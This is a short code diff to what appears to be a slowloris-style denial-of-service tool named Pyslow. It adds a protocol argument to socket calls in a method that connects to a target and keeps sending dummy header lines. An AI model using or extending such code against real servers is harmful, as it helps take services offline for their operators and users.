@@ -140,7 +140,7 @@ class Pyslow:
 		return sock
 	def sending_packets(self):
 		try:
-			sock=socket(AF_INET,SOCK_STREAM)
+			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
 			self.pkt_count+=3
@@ -148,7 +148,7 @@ class Pyslow:
 				sock.sendall('X-a: b\r\n')
 				self.pkt+=1
 		except Exception:
-			sock=socket(AF_INET,SOCK_STREAM)
+			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
 			sock.settimeout(None)
